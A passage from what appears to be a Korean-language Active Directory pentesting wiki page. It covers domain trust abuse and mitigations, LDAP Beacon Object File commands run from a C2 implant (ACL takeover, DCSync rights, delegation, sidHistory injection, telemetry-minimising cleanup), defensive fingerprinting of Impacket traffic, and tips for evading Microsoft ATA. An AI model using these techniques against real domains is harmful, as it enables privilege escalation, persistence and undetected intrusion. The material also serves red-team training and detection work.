하지만 **trusting domain이 domain을 trusted하면**, trusted domain은 **예측 가능한 이름**의 **user를 생성**하고, **trusted password를 비밀번호로 사용**합니다. 즉, **trusting domain의 user에 접근해 trusted domain에 들어가** 이를 열거하고 더 많은 privileges로 권한 상승을 시도할 수 있습니다:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain을 침해하는 또 다른 방법은 domain trust와 **반대 방향**으로 생성된 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)를 찾는 것입니다(이는 흔한 경우가 아닙니다).

trusted domain을 침해하는 또 다른 방법은 **trusted domain의 user가 RDP로 로그인할 수 있는** 머신에서 대기하는 것입니다. 그러면 공격자는 RDP 세션 프로세스에 코드를 주입하고, 그곳에서 **피해자의 원래 domain에 접근**할 수 있습니다.\
또한 **피해자가 자신의 하드 드라이브를 마운트했다면**, 공격자는 **RDP 세션** 프로세스를 통해 **하드 드라이브의 시작 폴더**에 **backdoors**를 저장할 수 있습니다. 이 기법은 **RDPInception**이라고 합니다.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust 악용 완화

### **SID Filtering:**

- forest trust에서 SID history attribute를 악용하는 공격의 위험은 SID Filtering으로 완화됩니다. SID Filtering은 기본적으로 모든 inter-forest trust에서 활성화되어 있습니다. 이는 Microsoft의 입장에 따라 domain이 아닌 forest를 보안 경계로 간주하고, intra-forest trust는 안전하다는 가정을 기반으로 합니다.
- 하지만 한 가지 문제가 있습니다. SID filtering은 애플리케이션과 사용자 접근을 방해할 수 있어 가끔 비활성화됩니다.

### **Selective Authentication:**

- inter-forest trust에서는 Selective Authentication을 사용해 두 forest의 user가 자동으로 인증되지 않도록 할 수 있습니다. 대신 user가 trusting domain 또는 forest 내의 domains와 servers에 접근하려면 명시적인 permissions가 필요합니다.
- 이러한 조치는 writable Configuration Naming Context (NC)의 악용이나 trust account에 대한 공격을 방지하지 못한다는 점에 유의해야 합니다.

[**ired.team에서 domain trust에 대한 자세한 정보를 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant를 통한 LDAP 기반 AD 악용

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection)은 bloodyAD 스타일의 LDAP primitives를 on-host implant(예: Adaptix C2) 내부에서만 실행되는 x64 Beacon Object Files로 재구현합니다. Operator는 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`를 실행해 pack을 컴파일하고, `ldap.axs`를 로드한 다음 beacon에서 `ldap <subcommand>`를 호출합니다. 모든 트래픽은 LDAP (389)의 현재 logon security context를 통해 signing/sealing과 함께 전달되거나, 자동 certificate trust가 적용된 LDAPS (636)를 통해 전달되므로 socks proxy나 디스크 아티팩트가 필요하지 않습니다.<sup>[[4]](#references)</sup>

### Implant 측 LDAP 열거

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, `get-groupmembers`는 짧은 이름/OU 경로를 전체 DN으로 변환하고 해당 객체를 덤프합니다.
- `get-object`, `get-attribute`, `get-domaininfo`는 임의의 attributes(보안 descriptors 포함)와 `rootDSE`의 forest/domain 메타데이터를 가져옵니다.
- `get-uac`, `get-spn`, `get-delegation`, `get-rbcd`는 roasting 대상, delegation 설정, LDAP에서 직접 가져온 기존 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors를 보여 줍니다.
- `get-acl`과 `get-writable --detailed`는 DACL을 파싱해 trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), inheritance를 나열하여 ACL privilege escalation의 즉각적인 대상을 제공합니다.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### 권한 상승 및 persistence를 위한 LDAP 쓰기 프리미티브

- Object creation BOF(`add-user`, `add-computer`, `add-group`, `add-ou`)를 사용하면 OU 권한이 있는 위치에 새로운 principal이나 machine account를 준비할 수 있습니다. 쓰기 속성 권한을 확인한 뒤에는 `add-groupmember`, `set-password`, `add-attribute`, `set-attribute`로 대상을 직접 탈취할 수 있습니다.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, `add-dcsync`와 같은 ACL 관련 명령은 모든 AD 객체에 대한 WriteDACL/WriteOwner 권한을 암호 재설정, 그룹 멤버십 제어 또는 DCSync 복제 권한으로 전환하며, PowerShell/ADSI 흔적을 남기지 않습니다. `remove-*` 대응 명령은 주입한 ACE를 정리합니다.

### Delegation, roasting 및 Kerberos 악용

- `add-spn`/`set-spn`을 사용하면 탈취한 사용자를 즉시 Kerberoastable하게 만들 수 있습니다. `add-asreproastable`(UAC 토글)은 암호를 건드리지 않고 해당 계정을 AS-REP roasting 대상으로 표시합니다.
- Delegation 매크로(`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`)는 beacon에서 `msDS-AllowedToDelegateTo`, UAC 플래그 또는 `msDS-AllowedToActOnBehalfOfOtherIdentity`를 다시 설정합니다. 이를 통해 constrained/unconstrained/RBCD 공격 경로를 활성화하고 원격 PowerShell이나 RSAT를 사용할 필요를 없앱니다.

### sidHistory 주입, OU 이동 및 공격 표면 조정

- `add-sidhistory`는 제어 중인 principal의 SID history에 권한이 높은 SID를 주입합니다([SID-History Injection](sid-history-injection.md) 참조). 이를 통해 LDAP/LDAPS만으로 은밀하게 액세스 권한을 상속받을 수 있습니다.
- `move-object`는 컴퓨터나 사용자의 DN/OU를 변경합니다. 공격자는 이를 통해 자산을 위임된 권한 범위 안으로 이동한 다음 `set-password`, `add-groupmember` 또는 `add-spn`을 사용할 수 있습니다. 이동 권한 및 상속 확인은 [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions)를 참조하세요.
- 범위가 제한된 제거 명령(`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` 등)을 사용하면 운영자가 자격 증명이나 persistence를 수집한 후 신속하게 원상 복구하여 telemetry를 최소화할 수 있습니다.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 몇 가지 일반적인 방어책

[**자격 증명 보호 방법을 자세히 알아보세요.**](../stealing-credentials/credentials-protections.md)

### **자격 증명 보호를 위한 방어 조치**

- **Domain Admins 제한**: Domain Admins는 Domain Controller에만 로그인할 수 있도록 하고 다른 호스트에서는 사용하지 않는 것이 좋습니다.
- **Service Account 권한**: 보안 유지를 위해 서비스는 Domain Admin(DA) 권한으로 실행하지 않아야 합니다.
- **권한 사용 시간 제한**: DA 권한이 필요한 작업은 사용 시간을 제한해야 합니다. 다음과 같이 설정할 수 있습니다. `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 완화**: Event ID 2889/3074/3075를 감사한 다음 DC/클라이언트에서 LDAP signing과 LDAPS channel binding을 적용해 LDAP MITM/relay 시도를 차단합니다.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket 활동의 프로토콜 수준 fingerprinting

흔히 사용되는 AD tradecraft를 탐지하려면 이름을 바꾼 바이너리, 서비스 이름, 임시 batch 파일 또는 출력 경로처럼 **운영자가 제어할 수 있는 흔적에만 의존하지 마세요**. 정상적인 Windows 클라이언트가 [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, WMI 트래픽을 생성하는 방식을 기준선으로 삼고, 운영자가 `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` 또는 `ntlmrelayx.py`를 수정한 뒤에도 남는 **구현상의 특징**을 찾으세요.<sup>[[8]](#references)</sup>

- **신뢰도가 높은 단독 탐지 후보**(자체 기준선과 비교 검증한 후):
  - `auth_context_id = 79231 + ctx_id`를 사용하는 인증된 DCE/RPC
  - `0xff`로 채워진 DCE/RPC 인증 padding
  - SPNEGO `mechToken`에 raw Kerberos `AP-REQ`를 직접 넣는 LDAP Kerberos bind
  - ASCII처럼 보이는 `ClientGuid` 값이 포함된 SMB2/3 negotiate 요청
  - 비표준 namespace `//./root/cimv2`를 사용하는 WMI `IWbemLevel1Login::NTLMLogin`
  - 하드코딩된 Kerberos nonce 값
- **상관 분석/점수화 기능으로 더 적합한 항목**:
  - Kerberos etype 목록이 지나치게 적거나 중복되는 경우, 비정상적이거나 누락된 `PA-DATA`, 또는 native Windows와 다른 TGS-REQ etype 순서
  - version info가 없는 NTLM Type 1 메시지 또는 null host name이 포함된 Type 3 메시지
  - SPNEGO 대신 DCE/RPC에 담긴 raw NTLMSSP, 누락된 DCE/RPC verification trailer 또는 SPNEGO/Kerberos OID 불일치
  - 동일한 host/user/session/time window에서 이러한 특징이 여러 개 발견되면, 단일한 약한 필드 하나보다 훨씬 강한 근거가 됩니다.
- **단독 경보가 아닌 보강 정보로 사용**:
  - 기본 파일 이름, 출력 경로, 무작위 서비스 이름, 임시 batch 이름, 기본 computer account 이름, 도구별 HTTP/WebDAV/RDP/MSSQL 문자열
  - 운영자가 쉽게 변경할 수 있으므로, 프로토콜 간 클러스터가 의심스러운 이유를 설명하는 데 활용하는 것이 좋습니다.
- **운영 참고 사항**:
  - 일부 신호를 확인하려면 복호화된 트래픽, [PCAP/Zeek 파싱](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW 또는 서비스 측 가시성이 필요합니다.
  - 경보로 전환하기 전에 Samba/Linux 클라이언트, 어플라이언스 및 레거시 소프트웨어를 대상으로 검증하세요.
  - 기준선에 대한 신뢰도를 높여 가면서 탐지를 보강 정보 -> 헌팅 -> 경보 순으로 전환하세요.

### **Deception 기법 구현**

- Deception을 구현할 때는 암호 만료가 없거나 Trusted for Delegation으로 표시된 계정과 같은 특징을 가진 가짜 사용자 또는 컴퓨터를 미끼로 배치합니다. 구체적으로는 특정 권한이 있는 사용자를 생성하거나 해당 사용자를 높은 권한의 그룹에 추가할 수 있습니다.<sup>[[2]](#references)</sup>
- 다음과 같은 도구를 사용하는 실용적인 예시는 다음과 같습니다. `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- deception 기법 배포에 대한 자세한 내용은 [GitHub의 Deploy-Deception](https://github.com/samratashok/Deploy-Deception)을 참조하세요.

### **Deception 식별**

- **사용자 객체**: 의심스러운 징후에는 일반적이지 않은 ObjectSID, 드문 로그인, 생성 날짜 및 낮은 bad password 횟수가 포함됩니다.
- **일반적인 징후**: 잠재적인 decoy 객체의 속성을 실제 객체의 속성과 비교하면 불일치가 드러날 수 있습니다. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster)와 같은 도구를 사용하면 이러한 deception을 식별하는 데 도움이 됩니다.

### **탐지 시스템 우회**

- **Microsoft ATA 탐지 우회**:
  - **사용자 열거**: ATA 탐지를 방지하려면 Domain Controller에서 세션 열거를 피합니다.
  - **Ticket 가장**: ticket 생성에 **aes** 키를 사용하면 NTLM으로 다운그레이드하지 않아 탐지를 피하는 데 도움이 됩니다.
  - **DCSync 공격**: ATA 탐지를 피하려면 Domain Controller가 아닌 곳에서 실행하는 것이 좋습니다. Domain Controller에서 직접 실행하면 경보가 발생합니다.

## References

- [1] [Domain Trust 공격 가이드](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory에서 deception을 위한 trust 위조](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin에서 Enterprise Admin으로](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory 악용을 위한 메모리 내 LDAP 툴킷](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash를 wordlist로 무기화하기](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket 분석](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon을 통해 Active Directory 계정 탈취](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472와 관련된 Netlogon 보안 채널 연결 변경 사항 관리 방법](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [잊혀진 Null Session 및 MS-RPC 인터페이스 탐구](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [도메인 간 보안 경계로서의 SID filter? (Part 4) - SID filtering 우회 연구](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [도메인 간 보안 경계로서의 SID filter? (Part 5) - Golden GMSA trust 공격 - child에서 parent로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [도메인 간 보안 경계로서의 SID filter? (Part 6) - Schema change trust 공격 - child에서 parent로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5를 이용해 DA에서 EA로](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS를 악용해 child domain의 관리자에서 5분 만에 enterprise admin으로 상승하기: 후속편](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL 백도어 설계](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 모듈 소스 코드](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 속성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
